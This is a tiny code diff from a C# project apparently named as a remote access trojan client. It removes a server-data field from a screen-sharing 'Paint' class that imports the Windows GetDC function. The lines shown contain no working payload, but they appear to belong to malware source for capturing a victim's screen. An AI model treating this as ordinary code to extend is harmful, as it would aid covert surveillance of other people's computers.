@@ -11,7 +11,6 @@ namespace RATclientSparta.Tools.ScreenShare
 {
     public class Paint
     {
-        private ServerData client;
         [DllImport("User32.dll")]
         public static extern IntPtr GetDC(IntPtr hwnd);
         private Graphics g;
